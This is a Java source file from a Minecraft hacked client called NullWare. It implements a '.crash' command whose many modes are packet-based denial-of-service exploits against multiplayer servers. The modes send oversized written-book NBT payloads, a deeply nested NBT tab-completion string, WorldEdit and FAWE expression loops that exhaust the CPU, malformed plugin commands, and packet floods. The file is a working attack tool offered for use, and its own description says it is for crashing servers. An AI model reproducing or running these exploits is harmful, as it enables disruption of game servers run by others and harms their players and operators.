package com.Vxrtrauter.NullWare.command.commands;

import com.Vxrtrauter.NullWare.command.Command;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;


import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;



public class CrashCommand implements Command {

    private final Minecraft mc = Minecraft.getMinecraft();
    private final Random random = new Random();

    @Override
    public String getName() {
        return "crash";
    }

    @Override
    public String getDescription() {
        return "Crash the server with various exploits.";
    }

    @Override
    public void execute(String[] args) {
        if (args.length < 1) {
            displayCrashMethods();
            return;
        }

        String mode = args[0].toUpperCase();

        if (mode.equals("CRASH")) {
            displayCrashMethods();
            return;
        }

        if (!isValidMode(mode)) {
            sendMessage("Unknown crash mode: " + mode);
            sendMessage("Type .crash for a list of Crash Modes");
            return;
        }

        int packets = 10;
        if (args.length > 1) {
            try {
                packets = Integer.parseInt(args[1]);
            } catch (NumberFormatException e) {
                sendMessage("Invalid number of packets specified. Defaulting to 10.");
            }
        }

        sendMessage("Executing crash mode: " + mode);
        sendMessage("Number of packets: " + packets);



    Minecraft mc = Minecraft.getMinecraft();
        ItemStack writtenBook = new ItemStack(Items.written_book);
        NBTTagCompound comp = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        StringBuilder content = new StringBuilder();
        char[] letters = new char[]{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'v', 'w', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
        int repeatCount1 = 1000;
        int repeatCount2 = 1250;


        String repeatedPart1 = repeatString("extra:[{text:L}],", repeatCount1);
        String repeatedPart2 = repeatString("extra:[{text:L}],", repeatCount2);


        switch (mode) {


            case "ONEPACKET":
                sendMessage("Sending OnePacket Packets...");


                for (int i = 0; i < packets; i++) {
                    NBTTagCompound compound = new NBTTagCompound();
                    NBTTagList pages = new NBTTagList();


                    String extraJson = "{\"text\":\"\".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................\"\"}";
                    pages.appendTag(new NBTTagString(extraJson));

                    compound.setString("author", RandomStringUtils.randomAlphabetic(10));
                    compound.setString("title", RandomStringUtils.randomAlphabetic(10));
                    compound.setByte("resolved", (byte) 1);
                    compound.setTag("pages", pages);

                    writtenBook = new ItemStack(Items.written_book);
                    writtenBook.setTagCompound(compound);

                    PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(writtenBook);

                    C17PacketCustomPayload packet = new C17PacketCustomPayload(
                            ThreadLocalRandom.current().nextBoolean() ? "MC|BEdit" : "MC|BSign",
                            packetBuffer
                    );

                    mc.getNetHandler().getNetworkManager().sendPacket(packet);
                }

                break;



            case "NETTY":
                sendMessage("Sending Book flooding Packets...");
                for (int i = 0; i < 100; i++)
                    list.appendTag(new NBTTagString("....."));

                comp.setString("author", RandomStringUtils.randomAlphabetic(10));
                comp.setString("title", RandomStringUtils.randomAlphabetic(10));
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);

                writtenBook.setTagCompound(comp);

                mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 2, 0, 0, writtenBook, (short) 1));
                break;


            case "NETTY2":
                sendMessage("Sending Book flooding Packets...");
                for (int i = 0; i < 150; i++) {
                    list.appendTag(new NBTTagString("................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................."));
                }

                comp.setString("author", mc.thePlayer.getName());
                comp.setString("title", "NullWare");
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);

                writtenBook.setTagCompound(comp);

                mc.getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(-1, writtenBook)); // Use 'writtenBook' here as well
                break;



            case "MVCBYPASS":
                sendMessage("Sending MVH Crash Packets...");
                mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/mvh ('.'\"\"+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.++)%"));
                break;



            case "RANDOMPACKETA":
                sendMessage("Sending random sign packets...");
                for (int i = 0; i < packets; i++) {

                    mc.getNetHandler().getNetworkManager().sendPacket(new C12PacketUpdateSign(mc.thePlayer.getPosition(),
                            new IChatComponent[]{
                                    new ChatComponentText("bella"),
                                    new ChatComponentText("bella"),
                                    new ChatComponentText("bella"),
                                    new ChatComponentText("bella")
                            }));
                }
                break;

            case "RANDOMPACKETB":
                sendMessage("Sending KeepAlive packets...");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C00PacketKeepAlive(0));
                }
                break;

            case "LPX":
                sendMessage("Sending LPX exploit packets... (probably won't have much effect)");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, mc.thePlayer.getHeldItem(), (short) 0));
                }
                break;

            case "EXPLOITFIXER1":
                sendMessage("Sending Book Packets...");
                content.append("{").append(repeatedPart1).append("text:L}");
                list.appendTag(new NBTTagString(content.toString()));

                comp.setString("author", "NullWare");
                comp.setString("title", "BOOK");
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);

                writtenBook.setTagCompound(comp);
                PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                buffer.writeItemStackToBuffer(writtenBook);

                mc.getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BSign", buffer));
                break;

            case "EXPLOITFIXER2":
                sendMessage("Sending Book Packets...");
                content.append("{").append(repeatedPart2).append("text:L}");
                list.appendTag(new NBTTagString(content.toString()));

                comp.setString("author", "NullWare");
                comp.setString("title", "BOOK");
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);

                writtenBook.setTagCompound(comp);
                buffer = new PacketBuffer(Unpooled.buffer());
                buffer.writeItemStackToBuffer(writtenBook);

                mc.getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BSign", buffer));
                break;


            case "CUSTOMPAYLOADFIXER":
                sendMessage("Sending Payload Packets...");
                String repeatedPart = repeatString("extra:[{text:L}],", 3100);
                content.append("{").append(repeatedPart).append("text:L}");

                list.appendTag(new NBTTagString(content.toString()));

                comp.setString("author", "SmogClient");
                comp.setString("title", "BOOK");
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);

                ItemStack stack = new ItemStack(Items.written_book);
                stack.setTagCompound(comp);

                mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 0, 1, 2, stack, (short) 0));
                break;




            case "CLICKEXC":
                sendMessage("Sending click window packets...");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, mc.thePlayer.getHeldItem(), (short) 0));
                }
                break;

            case "TABNBT":
                sendMessage("Sending tab completion with NBT...");
                mc.getNetHandler().getNetworkManager().sendPacket(new C14PacketTabComplete("/teammsg @a[nbt={a:[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[}]"));
                break;

            case "CONSOLESPAM":
                sendMessage("Spamming the console...");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, -1, 1, 1, new ItemStack(mc.thePlayer.getHeldItem().getItem()), (short) 0));
                }
                break;


            case "FAWE":
                sendMessage("Sending FAWE exploit packet...");
                mc.getNetHandler().getNetworkManager().sendPacket(new C14PacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));                break;

            case "WORLDEDIT":
                sendMessage("Sending WorldEdit exploit packet...");
                mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("//EVAL for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}"));
                break;

            case "BUNGEE":
                sendMessage("Sending BungeeCord packet...");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/bungee"));
                }
                break;

            case "BUNGEEREPORT":
                sendMessage("Sending BungeeCord Report Packets...");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C14PacketTabComplete("/report "));
                }
                break;
            case "VELOCITY":
                sendMessage("Sending Velocity version request...");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/velocity version"));
                }
                break;

            case "SKILLPLUGIN":
                sendMessage("Sending skill plugin exploit packet...");
                for (int i = 0; i < packets; i++) {
                    mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/skills"));
                }
                break;

            case "SKILLSPIGOT":
                sendMessage("Sending skill spigot exploit packet...");
                mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/skillč˝Ąă•ˇŕą‘â’Şç–µâ\u0090žňŽ‘©ŕ¤żć\u0090Ť â©ˇě‰Śá‹·ć¸źńĽ±Ťĺ ŻăŠ„ç«ąâš‚"));
                break;

            case "NPC":
                sendMessage("Sending NPC Packets...");
                Entity entity = Minecraft.getMinecraft().pointedEntity;
                entity.setCustomNameTag("🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑🎉🎞🎐🎑");
                entity.setDead();
                entity.setFire(5000);
                entity.getEyeHeight();
                entity.setEating(false);
                entity.setEating(true);
                entity.setEating(true);
                NBTTagList l = new NBTTagList();
                for (int i2 = 0; i2 < 12; i2++)
                    l.appendTag(new NBTTagString("38749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745 36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789"));
                mc.getNetHandler().addToSendQueue(new C02PacketUseEntity(entity, C02PacketUseEntity.Action.INTERACT));
                break;


            case "CREATIVE":
                sendMessage("Sending Creative Book Payloads...");
                for (int c = 0; c < packets; c++) {
                    list = new NBTTagList();
                    content.setLength(0);

                    for (int j = 0; j < 4000; j++) {
                        content.append(letters[random.nextInt(letters.length)]);
                    }

                    list.appendTag(new NBTTagString(content.toString()));

                    comp.setString("author", "NullWare");
                    comp.setString("title", "null");
                    comp.setByte("resolved", (byte) 1);
                    comp.setTag("pages", list);

                    writtenBook.setTagCompound(comp);

                    mc.getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(-1, writtenBook));
                }
                break;


        }
    }

    private void displayCrashMethods() {
        String[] methods = {
                "NETTY - Floods the server with a large written book packet containing 100 pages of dots (\".....\").",
                "NETTY2 - Sends a larger written book payload containing 150 pages of long text to stress the server.",
                "MVCBYPASS - Sends a crafted chat message to bypass server-side protections related to movement checks or other commands.",
                "RANDOMPACKETA - Sends random sign packets",
                "RANDOMPACKETB - Sends KeepAlive packets",
                "LPX - Exploit related to LPX  (currently broken)",
                "EXPLOITFIXER1 - Sends large book payloads",
                "EXPLOITFIXER2 - Another large book payload exploit",
                "CUSTOMPAYLOADFIXER - Sends custom payload packets",
                "CLICKEXC - Sends click window packets",
                "TABNBT - Sends tab completion with NBT",
                "CONSOLESPAM - Spams the console",
                "FAWE - Sends FAWE exploit packet",
                "WORLDEDIT - Sends WorldEdit exploit packet",
                "BUNGEE - Sends BungeeCord packet",
                "BUNGEEREPORT - Sends BungeeCord report packet",
                "VELOCITY - Sends Velocity version request",
                "SKILLPLUGIN - Sends skill plugin exploit packet",
                "SKILLSPIGOT - Sends spigot skill exploit packet",
                "NPC - Sends a custom name tag to an NPC and manipulates its behavior",
                "CREATIVE - Sends large book payloads to exploit creative mode",
                "ONEPACKET - Floods the server with a large written book packet"

        };

        sendMessage("Available crash methods:");
        for (String method : methods) {
            sendMessage(method);
        }
    }



    private String repeatString(String str, int times) {
        StringBuilder repeated = new StringBuilder();
        for (int i = 0; i < times; i++) {
            repeated.append(str);
        }
        return repeated.toString();
    }

    private boolean isValidMode(String mode) {
        switch (mode) {
            case "NETTY":
            case "NETTY2":
            case "MVCBYPASS":
            case "RANDOMPACKETA":
            case "RANDOMPACKETB":
            case "LPX":
            case "EXPLOITFIXER1":
            case "EXPLOITFIXER2":
            case "CUSTOMPAYLOADFIXER":
            case "CLICKEXC":
            case "TABNBT":
            case "CONSOLESPAM":
            case "FAWE":
            case "WORLDEDIT":
            case "BUNGEE":
            case "BUNGEEREPORT":
            case "VELOCITY":
            case "SKILLPLUGIN":
            case "SKILLSPIGOT":
            case "NPC":
            case "CREATIVE":
            case "ONEPACKET":
                return true;
            default:
                return false;
        }
    }

}
